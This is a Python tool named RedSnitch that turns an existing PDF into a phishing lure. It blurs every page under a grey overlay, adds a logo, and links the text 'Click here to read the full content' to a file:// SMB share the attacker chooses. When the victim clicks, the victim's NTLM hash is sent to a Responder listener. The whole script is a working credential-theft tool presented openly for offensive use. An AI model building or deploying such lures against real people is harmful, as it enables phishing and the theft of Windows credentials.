#pip install PyPDF2
from reportlab.lib.utils import ImageReader
from PyPDF2 import PdfReader, PdfWriter
from reportlab.lib.pagesizes import letter
from reportlab.lib import colors
from reportlab.pdfgen import canvas
import sys
import io
import os
import cairosvg


# Colors
# Reset to default
RESET = "\033[0m"
# Define the colors
RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"


def banner():    
    # Print large banner content
    print(f"""
    {RED}██████╗ ███████╗██████╗ {RESET}███████╗███╗   ██╗██╗████████╗ ██████╗██╗  ██╗
    {RED}██╔══██╗██╔════╝██╔══██╗{RESET}██╔════╝████╗  ██║██║╚══██╔══╝██╔════╝██║  ██║
    {RED}██████╔╝█████╗  ██║  ██║{RESET}███████╗██╔██╗ ██║██║   ██║   ██║     ███████║
    {RED}██╔══██╗██╔══╝  ██║  ██║{RESET}╚════██║██║╚██╗██║██║   ██║   ██║     ██╔══██║
    {RED}██║  ██║███████╗██████╔╝{RESET}███████║██║ ╚████║██║   ██║   ╚██████╗██║  ██║
    {RED}╚═╝  ╚═╝╚══════╝╚═════╝ {RESET}╚══════╝╚═╝  ╚═══╝╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
                    
                                    {RED}NTLM Hash Snitching via Malicious PDFs{RESET}
            
        Developed by eMVee

    """)

# Function to check if a module is installed
def check_module(module_name):
    try:
        __import__(module_name)
    except ImportError:
        print(f"Module '{module_name}' is not installed. Please install it using:")
        print(f"pip install {module_name}")
        sys.exit(1)

def convert_svg_to_png(directory):
    # Iterate through all files in the specified directory
    for filename in os.listdir(directory):
        if filename.endswith('.svg'):
            svg_path = os.path.join(directory, filename)
            png_path = os.path.join(directory, filename[:-4] + '.png')  # Change .svg to .png

            # Convert SVG to PNG
            try:
                cairosvg.svg2png(url=svg_path, write_to=png_path)
                #print(f"Converted: {svg_path} to {png_path}")
            except Exception as e:
                print(f"Error converting {svg_path}: {e}")

def list_images(folder_path):
    # Get a list of all files in the directory
    files = os.listdir(folder_path)
    
    # Filter out the .png files and create a list of image names without the extension
    image_names = [f[:-4] for f in files if f.endswith('.png')]
    
    return image_names

def display_images(image_names, folder_path, page_size=10):
    total_images = len(image_names)
    total_pages = (total_images + page_size - 1) // page_size  # Calculate total pages

    current_page = 0

    while True:
        # Calculate the start and end index for the current page
        start_index = current_page * page_size
        end_index = min(start_index + page_size, total_images)

        # Display the images for the current page
        print("\nSelect an image by entering the corresponding number:")
        print("0: Specify your own PNG image path")  # Option to specify own image
        for index in range(start_index, end_index):
            print(f"{index + 1}: {image_names[index]}")

        # Ask the user for input
        if end_index < total_images:
            print("Type 'n' for next page, 'p' for previous page, or 'q' to quit.")
        elif current_page > 0:
            print("Type 'p' for previous page or 'q' to quit.")
        else:
            print("Type 'q' to quit.")

        user_input = input("Your choice: ").strip().lower()

        if user_input == 'n' and current_page < total_pages - 1:
            current_page += 1
        elif user_input == 'p' and current_page > 0:
            current_page -= 1
        elif user_input == 'q':
            break
        else:
            try:
                choice = int(user_input)
                if choice == 0:
                    user_image_path = input("[?] Please specify the full path to a PNG image: ")
                    if os.path.isfile(user_image_path) and user_image_path.endswith('.png'):
                        print(f"You specified: {user_image_path}")
                        break
                    else:
                        print("[E] The specified path is not valid or does not point to a PNG file.")
                elif 1 <= choice <= total_images:
                    selected_image = image_names[choice - 1]
                    image_path = os.path.join(folder_path, selected_image + '.png')
                    return image_path
                    break
                else:
                    print("[E] Invalid choice. Please select a number from the menu.")
            except ValueError:
                print("[E] Invalid input. Please enter a number or a command.")

def create_overlay_pdf(original_pdf_path, output_pdf_path, text, link, image_path=None):
    print(f"\n{RED}[✓] Just a flick of my wand, and with a sprinkle of magic, the Phishing Data Forwarding (PDF) file shall soon appear. \n    Patience, dear friend, for even the finest spells take a moment to brew!{RESET}")
    # Create a PDF in memory
    packet = io.BytesIO()
    can = canvas.Canvas(packet, pagesize=letter)

    # Get dimensions and convert to integers
    width, height = map(int, letter)

    # Create a pixelated effect by drawing semi-transparent squares
    pixel_size = 4  # Size of each pixel block
    for x in range(0, width, pixel_size):
        for y in range(0, height, pixel_size):
            # Draw a semi-transparent grey square for the pixelated effect
            can.setFillColor(colors.grey)
            can.setFillAlpha(0.98)  # Set transparency to 95%
            can.rect(x, y, pixel_size, pixel_size, fill=True, stroke=False)
    
    width, height = letter  # This sets the page size to letter (8.5 x 11 inches)

    # Add an image if provided
    if image_path and os.path.isfile(image_path):
        # Load the image to get its original dimensions
        image = ImageReader(image_path)
        original_width, original_height = image.getSize()

        # Set the desired width as 50% of the page width
        desired_width = width * 0.5 

        # Calculate the height to maintain the aspect ratio
        aspect_ratio = original_height / original_width
        image_height = desired_width * aspect_ratio

        # Center the image
        image_x = (width - desired_width) / 2
        image_y = height - image_height - 150  # Adjust Y position as needed

        # Draw the image
        can.drawImage(image_path, image_x, image_y, width=desired_width, height=image_height, mask='auto')

        # Calculate the text position based on the image height and add 1 cm (28.35 points) spacing
        text_y_position = image_y - image_height - 28.35  # 1 cm below the image
    else:
        # If no image is provided, set a default text position
        text_y_position = height - 160  # Default position if no image
        image_x = 0  # No image, so set to 0
        image_y = 0  # No image, so set to 0

    # Add your text below the image
    can.setFillColor(colors.red)  # Set text color to red
    can.setFont("Helvetica", 24)

    text_x_position = 72  # Start 1 inch from the left
    max_width = width - 144  # 1 inch margin on each side

    # Create a text object for wrapping
    text_object = can.beginText(text_x_position, text_y_position)
    text_object.setFont("Helvetica", 24)

    # Split the text into lines that fit within the page width
    for line in text.splitlines():
        words = line.split()
        current_line = ""

        for word in words:
            # Check if adding the next word exceeds the max width
            test_line = current_line + word + ' '
            if can.stringWidth(test_line, "Helvetica", 24) > max_width:
                # Draw the current line and reset
                text_object.textLine(current_line)
                current_line = word + ' '  # Start a new line
            else:
                current_line = test_line  # Add the word to the current line

        # Draw any remaining text in the current line
        if current_line:
            text_object.textLine(current_line)

    can.drawText(text_object)

    # Create a clickable link that covers the entire text area
    link_height = text_object.getY() - text_y_position + 24  # Adjust height based on font size
    can.linkURL(link, (text_x_position, text_y_position - 5, text_x_position + max_width, text_y_position - 5 + link_height), relative=1)

    can.save()
    packet.seek(0)

    # Read the original PDF
    reader = PdfReader(original_pdf_path)
    writer = PdfWriter()

    # Merge the overlay with the original
    for page in range(len(reader.pages)):
        original_page = reader.pages[page]
        overlay_page = PdfReader(packet).pages[0]
        original_page.merge_page(overlay_page)
        writer.add_page(original_page)
    
    # Write the output PDF
    with open(output_pdf_path, "wb") as f:
        writer.write(f)

def main():
    banner()
    # Check for required modules
    check_module('PyPDF2')
    check_module('reportlab')
    check_module('cairosvg')
    try:
        folder_path = 'logo'  # Change this to your folder path
        # Convert default SVG logos to a PNG
        convert_svg_to_png(folder_path)
        image_names = list_images(folder_path)
        #original_pdf = "sample.pdf"
        original_pdf = input("[?] Enter the path for the original PDF: ")
        output_pdf = input("[?] Enter the filename to save your PDF: ")
        text_to_add = "Your PDF has been secured due to privacy content. Click here to read the full content!"
        link_to_file = input("[?] Enter the SMB share for responder like: 'file://192.168.12.123/share/file.pdf': ")
        
        if image_names:
            image_file_path = display_images(image_names, folder_path)  # Pass folder_path here
        else:
            print("[E] No PNG images found in the specified folder.")
            user_image_path = input("Please specify the full path to a PNG image: ")
            
            if os.path.isfile(user_image_path) and user_image_path.endswith('.png'):
                print(f"You specified: {user_image_path}")
            else:
                print("[E] The specified path is not valid or does not point to a PNG file.")

        
        create_overlay_pdf(original_pdf, output_pdf, text_to_add, link_to_file, image_file_path)
    except KeyboardInterrupt:
        print(f"\n{RED}[x] You've caught the Golden Snitch! Time to fly away. Until next time, wizard!{RESET}")

if __name__ == "__main__":
    main()
